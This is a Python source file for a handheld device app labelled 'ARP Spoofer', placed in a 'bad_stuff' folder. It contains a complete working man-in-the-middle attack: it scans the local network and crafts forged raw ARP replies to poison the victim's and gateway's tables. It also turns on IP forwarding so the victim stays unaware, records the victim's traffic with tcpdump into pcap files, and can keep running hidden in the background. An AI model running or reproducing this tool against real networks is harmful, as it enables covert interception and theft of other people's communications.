"""
apps/bad_stuff/network/arp_spoofer/app.py
ARP Spoofer — Man-in-the-Middle attack with tcpdump capture.

Screens:
  SCAN   — ARP scan LAN, pick a target
  ATTACK — live stats: pkts sent, capture size, elapsed time

Background mode:
  Press KEY3 during ATTACK to hide the app and keep running.
  ARP spoofing + tcpdump continue in background.
  Re-open the app to see live stats or stop.

Captures saved to:
  /home/mark/pi-gadget/menu_fs/02_files/arp_spoof/
  Filename: mitm_<victim_ip>_<timestamp>.pcap

Controls:
  SCAN:
    UP / DOWN  — select target
    CENTER     — start attack
    KEY1       — rescan network
    KEY3       — exit

  ATTACK (running):
    KEY1       — stop attack + save capture
    KEY3       — send to background (keep running)
"""

import os
import socket
import subprocess
import threading
import time
from PIL import Image, ImageDraw
from core.background import bgm

# ── Paths ─────────────────────────────────────────────────────
BASE_DIR = os.path.dirname(
    os.path.dirname(
        os.path.dirname(
            os.path.dirname(
                os.path.dirname(os.path.abspath(__file__))
            )
        )
    )
)
CAPTURE_DIR = os.path.join(BASE_DIR, "menu_fs", "02_files", "arp_spoof")

APP_NAME  = "ARP Spoofer"
RESOURCES = []   # no exclusive hardware needed (uses wlan0 in managed mode)

# ── Layout ────────────────────────────────────────────────────
TOP_H = 26
BOT_H = 18
ROW_H = 22

# ── Palette ───────────────────────────────────────────────────
BG     = (4,   8,   16)
HDR_BG = (8,   14,  28)
SEL_BG = (12,  25,  50)
SEP    = (25,  45,  75)
SEP_HI = (50,  90,  140)
WHITE  = (220, 235, 255)
DIM    = (70,  100, 140)
HINT   = (50,  75,  110)
CYAN   = (0,   210, 255)
GREEN  = (50,  220, 120)
YELLOW = (255, 200, 50)
RED    = (255, 70,  70)
ORANGE = (255, 140, 30)
PURPLE = (160, 80,  255)


# ── Shell helper ──────────────────────────────────────────────

def _sh(cmd, timeout=20):
    try:
        r = subprocess.run(
            cmd, capture_output=True, timeout=timeout,
            shell=isinstance(cmd, str)
        )
        return r.returncode, (r.stdout + r.stderr).decode("utf-8", errors="ignore")
    except subprocess.TimeoutExpired:
        return 1, "timeout"
    except Exception as e:
        return 1, str(e)


def _kill_proc(proc):
    """Gracefully terminate a subprocess: SIGTERM then SIGKILL."""
    if proc is None:
        return
    try:
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait(timeout=2)
    except Exception:
        pass


# ── Network helpers ───────────────────────────────────────────

def _get_gateway() -> str:
    _, out = _sh(["ip", "route", "show", "default"])
    parts = out.split()
    if "via" in parts:
        return parts[parts.index("via") + 1]
    return ""


def _get_iface() -> str:
    _, out = _sh(["ip", "route", "show", "default"])
    parts = out.split()
    if "dev" in parts:
        return parts[parts.index("dev") + 1]
    return "wlan0"


def _get_own_mac(iface: str) -> str:
    _, out = _sh(f"cat /sys/class/net/{iface}/address 2>/dev/null")
    return out.strip()


def _arp_scan() -> list:
    """ARP scan the local network. Returns sorted list of {ip, mac, hostname}."""
    _, raw = _sh(["sudo", "arp-scan", "--localnet", "-q"], timeout=25)
    hosts = []
    for line in raw.splitlines():
        parts = line.split()
        if len(parts) >= 2 and "." in parts[0] and ":" in parts[1]:
            ip  = parts[0]
            mac = parts[1]
            try:
                hostname = socket.gethostbyaddr(ip)[0]
            except Exception:
                hostname = ""
            hosts.append({"ip": ip, "mac": mac, "hostname": hostname})
    hosts.sort(key=lambda h: [int(x) for x in h["ip"].split(".")])
    return hosts


def _get_mac_for_ip(ip: str, iface: str) -> str:
    """Resolve MAC for IP from ARP cache, pinging first if needed."""
    for _ in range(2):
        _, out = _sh(["arp", "-n", ip])
        for line in out.splitlines():
            parts = line.split()
            if len(parts) >= 3 and parts[0] == ip and ":" in parts[2]:
                return parts[2]
        _sh(["ping", "-c", "1", "-W", "1", ip], timeout=3)
    return ""


def _mac_bytes(mac: str) -> bytes:
    return bytes(int(x, 16) for x in mac.split(":"))


def _build_arp_reply(sender_ip: str, sender_mac: str,
                     target_ip: str, target_mac: str) -> bytes:
    """Build a raw Ethernet ARP reply (opcode 2) frame."""
    dst = _mac_bytes(target_mac)
    src = _mac_bytes(sender_mac)
    eth = dst + src + b'\x08\x06'
    arp = (b'\x00\x01'
           + b'\x08\x00'
           + b'\x06\x04'
           + b'\x00\x02'
           + src + socket.inet_aton(sender_ip)
           + dst + socket.inet_aton(target_ip))
    return eth + arp


def _set_ip_forward(enable: bool):
    val = "1" if enable else "0"
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write(val)
    except Exception:
        _sh(["sudo", "sysctl", "-w", f"net.ipv4.ip_forward={val}"])


def _restore_arp(victim_ip: str, victim_mac: str,
                 gateway_ip: str, gateway_mac: str, iface: str):
    """Send 5 honest ARP replies to both sides to restore their tables."""
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        sock.bind((iface, 0))
        p1 = _build_arp_reply(gateway_ip, gateway_mac, victim_ip,  victim_mac)
        p2 = _build_arp_reply(victim_ip,  victim_mac,  gateway_ip, gateway_mac)
        for _ in range(5):
            sock.send(p1)
            sock.send(p2)
            time.sleep(0.2)
        sock.close()
    except Exception:
        pass


def _fmt_bytes(n: int) -> str:
    if n < 1024:       return f"{n} B"
    if n < 1048576:    return f"{n // 1024} KB"
    return f"{n / 1048576:.1f} MB"


# ── App ───────────────────────────────────────────────────────

class ArpSpooferApp:
    def __init__(self, hw, fonts, monitor=None):
        self.hw = hw
        self.font_big, self.font_small, self.font_label = fonts

        self.screen     = "SCAN"
        self._dirty     = True

        # SCAN state
        self.hosts      = []
        self.host_sel   = 0
        self.scroll     = 0
        self._scanning  = False
        self._scan_dots = 0
        self._scan_tmr  = 0.0

        # ATTACK state — persists when app goes to background
        self._attacking     = False
        self._stop_event    = threading.Event()
        self._attack_thread = None

        self._victim_host   = None
        self._gateway_ip    = ""
        self._gateway_mac   = ""
        self._iface         = ""
        self._own_mac       = ""

        self._pkts_sent     = 0
        self._elapsed       = 0.0
        self._attack_start  = 0.0
        self._status_msg    = ""

        # tcpdump state
        self._dump_proc     = None
        self._capture_path  = ""

    # ── Lifecycle ─────────────────────────────────────────────

    def on_enter(self):
        self._dirty = True
        # If attack is still running (resumed from background) → show ATTACK screen
        if self._attacking:
            self.screen = "ATTACK"
        else:
            self.screen = "SCAN"
            if not self.hosts:
                self._start_scan()

    def on_exit(self):
        # Called when navigating away normally (not via "background").
        # Stop everything cleanly.
        self._stop_attack(wait=False)

    # ── Scanning ──────────────────────────────────────────────

    def _start_scan(self):
        if self._scanning:
            return
        self._scanning  = True
        self._scan_dots = 0
        self._dirty     = True
        threading.Thread(target=self._do_scan, daemon=True).start()

    def _do_scan(self):
        self.hosts     = _arp_scan()
        self.host_sel  = 0
        self.scroll    = 0
        self._scanning = False
        self._dirty    = True

    # ── tcpdump ───────────────────────────────────────────────

    def _start_tcpdump(self, victim_ip: str, iface: str):
        """Start tcpdump capturing victim traffic to a timestamped .pcap."""
        os.makedirs(CAPTURE_DIR, exist_ok=True)
        ts   = time.strftime("%Y%m%d_%H%M%S")
        safe = victim_ip.replace(".", "_")
        self._capture_path = os.path.join(
            CAPTURE_DIR, f"mitm_{safe}_{ts}.pcap"
        )
        try:
            # sudo required — child processes don't inherit cap_net_raw from python3
            # Filter must be separate tokens, not a single string argument
            self._dump_proc = subprocess.Popen(
                ["sudo", "tcpdump", "-i", iface, "-w", self._capture_path,
                 "-n", "host", victim_ip],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.PIPE,   # keep stderr readable for error detection
            )
            # Give tcpdump 0.5s to start; if it dies immediately → error
            import time as _time
            _time.sleep(0.5)
            if self._dump_proc.poll() is not None:
                err = self._dump_proc.stderr.read(80).decode("utf-8", errors="ignore")
                self._status_msg = f"dump: {err.strip()[:24]}"
                self._dump_proc  = None
        except FileNotFoundError:
            self._status_msg = "tcpdump not installed"
            self._dump_proc  = None
        except Exception as e:
            self._status_msg = f"dump err: {str(e)[:18]}"
            self._dump_proc  = None

    def _stop_tcpdump(self):
        """Terminate tcpdump and flush the .pcap file."""
        _kill_proc(self._dump_proc)
        self._dump_proc = None

    def _capture_size(self) -> int:
        try:
            return os.path.getsize(self._capture_path) if self._capture_path else 0
        except Exception:
            return 0

    # ── Attack ────────────────────────────────────────────────

    def _start_attack(self, host: dict):
        self._victim_host  = host
        self._pkts_sent    = 0
        self._elapsed      = 0.0
        self._attack_start = time.time()
        self._status_msg   = "Resolving..."
        self._attacking    = True
        self.screen        = "ATTACK"
        self._stop_event.clear()
        self._dirty        = True

        self._attack_thread = threading.Thread(
            target=self._attack_loop, daemon=True
        )
        self._attack_thread.start()

        # Register AFTER thread start so bgm callback can't fire before loop begins.
        # Use non-blocking lambda — bgm callbacks must never block the main thread.
        bgm.register(APP_NAME, RESOURCES,
                     lambda: self._stop_attack(wait=False),
                     instance=self, module="bad_stuff.network.arp_spoofer")

    def _attack_loop(self):
        """
        Main spoof loop. Runs in a daemon thread —
        survives UI navigation when app is in background.
        """
        try:
            iface       = _get_iface()
            gateway_ip  = _get_gateway()
            own_mac     = _get_own_mac(iface)

            if not gateway_ip:
                self._status_msg = "No gateway found"
                self._attacking  = False
                self._dirty      = True
                return

            self._status_msg = "Resolving MACs..."
            self._dirty      = True

            victim_ip   = self._victim_host["ip"]
            victim_mac  = self._victim_host["mac"]
            gateway_mac = _get_mac_for_ip(gateway_ip, iface)

            if not gateway_mac:
                self._status_msg = "Gateway MAC fail"
                self._attacking  = False
                self._dirty      = True
                return

            self._gateway_ip  = gateway_ip
            self._gateway_mac = gateway_mac
            self._iface       = iface
            self._own_mac     = own_mac

            # Enable IP forwarding so victim keeps internet access
            _set_ip_forward(True)

            # Start tcpdump before first spoof packet so nothing is missed
            self._start_tcpdump(victim_ip, iface)
            self._status_msg = "Spoofing..."
            self._dirty      = True

            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
            sock.bind((iface, 0))

            while not self._stop_event.is_set():
                # Tell victim: gateway IP is at our MAC
                sock.send(_build_arp_reply(gateway_ip, own_mac,
                                           victim_ip,  victim_mac))
                # Tell gateway: victim IP is at our MAC
                sock.send(_build_arp_reply(victim_ip,  own_mac,
                                           gateway_ip, gateway_mac))
                self._pkts_sent += 2
                self._elapsed    = time.time() - self._attack_start
                self._dirty      = True
                self._stop_event.wait(timeout=2.0)

            sock.close()

            # Clean up in order: stop dump first, then fix ARP tables
            self._stop_tcpdump()
            self._status_msg = "Restoring ARP..."
            self._dirty      = True
            _restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, iface)
            _set_ip_forward(False)
            self._status_msg = "Stopped"

        except PermissionError:
            self._status_msg = "Need cap_net_raw"
        except Exception as e:
            self._status_msg = str(e)[:28]
        finally:
            self._stop_tcpdump()
            self._attacking = False
            bgm.unregister(APP_NAME)
            self._dirty     = True

    def _stop_attack(self, wait: bool = True):
        """Signal the loop to stop. Optionally block until it finishes."""
        if self._attacking:
            self._stop_event.set()
        if wait and self._attack_thread:
            self._attack_thread.join(timeout=5)

    # ── Events ────────────────────────────────────────────────

    def on_event(self, event) -> str:
        if self.screen == "SCAN":
            if event == "KEY3":
                return "exit"
            if event == "KEY1" and not self._scanning:
                self._start_scan()
            if event == "UP" and self.host_sel > 0:
                self.host_sel -= 1
                self._fix_scroll()
                self._dirty = True
            if event == "DOWN" and self.host_sel < len(self.hosts) - 1:
                self.host_sel += 1
                self._fix_scroll()
                self._dirty = True
            if event == "CENTER" and self.hosts and not self._scanning:
                self._start_attack(self.hosts[self.host_sel])

        elif self.screen == "ATTACK":
            if event == "KEY3":
                # Send to background — attack + tcpdump keep running
                return "background"
            if event == "KEY1":
                # Stop attack and return to SCAN
                self._stop_attack(wait=True)
                self.screen = "SCAN"
                self._dirty = True

        return "stay"

    def _max_rows(self) -> int:
        return (self.hw.H - TOP_H - BOT_H) // ROW_H

    def _fix_scroll(self):
        max_r = self._max_rows()
        if self.host_sel < self.scroll:
            self.scroll = self.host_sel
        elif self.host_sel >= self.scroll + max_r:
            self.scroll = self.host_sel - max_r + 1

    # ── Update ────────────────────────────────────────────────

    def update(self, dt):
        if self._scanning:
            self._scan_tmr += dt
            if self._scan_tmr >= 0.4:
                self._scan_tmr  = 0.0
                self._scan_dots = (self._scan_dots + 1) % 4
            self._dirty = True
        if self._attacking:
            self._dirty = True

    # ── Draw ──────────────────────────────────────────────────

    def draw(self):
        if not self._dirty:
            return
        self._dirty = False

        W, H = self.hw.W, self.hw.H
        img  = Image.new("RGB", (W, H), BG)
        d    = ImageDraw.Draw(img)

        self._draw_header(d, W)

        if self.screen == "SCAN":
            self._draw_scan(d, W, H, TOP_H)
        elif self.screen == "ATTACK":
            self._draw_attack(d, W, H, TOP_H)

        self._draw_bottom(d, W, H)
        self.hw.show(img)

    # ── Header ────────────────────────────────────────────────

    def _draw_header(self, d, W):
        d.rectangle([(0, 0), (W, TOP_H)], fill=HDR_BG)
        d.rectangle([(0, 0), (3, TOP_H)], fill=RED)
        d.text((10, (TOP_H - self.font_label.size) // 2),
               "ARP SPOOFER", font=self.font_label, fill=RED)

        if self._attacking:
            badge, col = "■ LIVE", RED
        elif self._scanning:
            badge, col = "◌ SCAN", YELLOW
        else:
            badge, col = "● READY", GREEN

        bw, bh = self._ts(d, badge, self.font_label)
        d.text((W - bw - 6, (TOP_H - bh) // 2),
               badge, font=self.font_label, fill=col)
        d.line([(0, TOP_H), (W, TOP_H)], fill=SEP_HI, width=1)

    # ── SCAN screen ───────────────────────────────────────────

    def _draw_scan(self, d, W, H, y0):
        if self._scanning:
            msg = "Scanning" + "." * self._scan_dots
            mw, mh = self._ts(d, msg, self.font_label)
            cy = y0 + (H - BOT_H - y0) // 2
            d.text(((W - mw) // 2, cy - mh // 2),
                   msg, font=self.font_label, fill=CYAN)
            return

        if not self.hosts:
            self._draw_empty(d, W, H, y0, "No hosts found", "K1: rescan")
            return

        cnt = f"{len(self.hosts)} hosts"
        cw, _ = self._ts(d, cnt, self.font_label)
        d.text((W - cw - 5, y0 + 2), cnt, font=self.font_label, fill=DIM)

        max_r   = (H - BOT_H - y0) // ROW_H
        visible = self.hosts[self.scroll: self.scroll + max_r]
        y       = y0

        for i, host in enumerate(visible):
            idx    = self.scroll + i
            is_sel = idx == self.host_sel
            y1r    = y + ROW_H

            if is_sel:
                d.rectangle([(0, y), (W, y1r - 1)], fill=SEL_BG)
                d.rectangle([(0, y), (2, y1r - 1)], fill=RED)

            name = host["hostname"] if host["hostname"] else host["ip"]
            col  = RED if is_sel else WHITE
            d.text((8, y + (ROW_H - self.font_label.size) // 2),
                   self._trunc(d, name, self.font_label, W - 30),
                   font=self.font_label, fill=col)

            if is_sel:
                aw, ah = self._ts(d, ">", self.font_label)
                d.text((W - aw - 5, y + (ROW_H - ah) // 2),
                       ">", font=self.font_label, fill=RED)

            d.line([(0, y1r - 1), (W, y1r - 1)], fill=SEP, width=1)
            y += ROW_H

        # Scrollbar
        total = len(self.hosts)
        if total > max_r:
            area_h = H - BOT_H - y0
            bar_h  = max(10, int(area_h * max_r / total))
            bar_y  = y0 + int(
                (area_h - bar_h) * self.scroll / max(1, total - max_r)
            )
            d.rectangle([W - 3, bar_y, W - 1, bar_y + bar_h], fill=DIM)

    # ── ATTACK screen ─────────────────────────────────────────

    def _draw_attack(self, d, W, H, y0):
        M  = 10
        lh = self.font_label.size + 9
        y  = y0 + 8

        victim = self._victim_host
        if not victim:
            return

        # Victim name banner
        hostname = victim.get("hostname", "")
        if hostname and hostname != victim["ip"]:
            # Show hostname on top, IP below
            hn = self._trunc(d, hostname, self.font_small, W - M * 2)
            nw, nh = self._ts(d, hn, self.font_small)
            d.text(((W - nw) // 2, y), hn, font=self.font_small, fill=RED)
            y += nh + 2
            iw, ih = self._ts(d, victim["ip"], self.font_label)
            d.text(((W - iw) // 2, y), victim["ip"],
                   font=self.font_label, fill=DIM)
            y += ih + 8
        else:
            # No hostname — show IP once, larger
            iw, ih = self._ts(d, victim["ip"], self.font_small)
            d.text(((W - iw) // 2, y), victim["ip"],
                   font=self.font_small, fill=RED)
            y += ih + 8

        d.line([(M, y), (W - M, y)], fill=SEP, width=1)
        y += 8

        # Stats rows
        mins = int(self._elapsed) // 60
        secs = int(self._elapsed) % 60
        cap  = _fmt_bytes(self._capture_size())

        rows = []
        if self._gateway_ip:
            rows.append(("Gateway",  self._gateway_ip,         YELLOW))
        rows.append(    ("Time",     f"{mins:02d}:{secs:02d}", CYAN))
        rows.append(    ("ARP pkts", str(self._pkts_sent),      GREEN))
        rows.append(    ("Capture",  cap,                       ORANGE))

        s_col = YELLOW if self._attacking else DIM
        rows.append(("Status", self._status_msg, s_col))

        for label, value, col in rows:
            lbl = label + ":"
            lw, _ = self._ts(d, lbl, self.font_label)
            d.text((M, y), lbl, font=self.font_label, fill=DIM)
            val = self._trunc(d, value, self.font_label, W - M * 2 - lw - 4)
            vw, _ = self._ts(d, val, self.font_label)
            d.text((W - vw - M, y), val, font=self.font_label, fill=col)
            d.line([(M, y + lh - 3), (W - M, y + lh - 3)],
                   fill=(15, 25, 45), width=1)
            y += lh

        # Capture filename hint
        if self._capture_path:
            fn = os.path.basename(self._capture_path)
            fn = self._trunc(d, fn, self.font_label, W - M * 2)
            fw, _ = self._ts(d, fn, self.font_label)
            d.text(((W - fw) // 2, y + 2), fn,
                   font=self.font_label, fill=(40, 60, 90))

        # Pulsing bar while live
        if self._attacking:
            pw  = int(W * ((self._elapsed % 2.0) / 2.0))
            col = RED if int(self._elapsed * 2) % 2 == 0 else (60, 0, 0)
            d.rectangle([(0, TOP_H + 1), (pw, TOP_H + 3)], fill=col)

    # ── Bottom hint bar ───────────────────────────────────────

    def _draw_bottom(self, d, W, H):
        d.line([(0, H - BOT_H), (W, H - BOT_H)], fill=SEP, width=1)
        if self.screen == "SCAN":
            hint = "CTR:attack  K1:scan  K3:exit"
        else:
            hint = "K1:stop  K3:background"
        hint = self._trunc(d, hint, self.font_label, W - 4)
        hw2, hh = self._ts(d, hint, self.font_label)
        d.text(((W - hw2) // 2, H - hh - 2),
               hint, font=self.font_label, fill=HINT)

    # ── Helpers ───────────────────────────────────────────────

    def _ts(self, d, text, font):
        b = d.textbbox((0, 0), text, font=font)
        return b[2] - b[0], b[3] - b[1]

    def _trunc(self, d, text, font, max_w):
        while text:
            w, _ = self._ts(d, text, font)
            if w <= max_w:
                return text
            text = text[:-2] + "…"
        return ""

    def _draw_empty(self, d, W, H, y0, line1, line2=""):
        cy = y0 + (H - BOT_H - y0) // 2
        mw, mh = self._ts(d, line1, self.font_label)
        d.text(((W - mw) // 2, cy - mh - 2),
               line1, font=self.font_label, fill=DIM)
        if line2:
            sw, _ = self._ts(d, line2, self.font_label)
            d.text(((W - sw) // 2, cy + 2),
                   line2, font=self.font_label, fill=HINT)
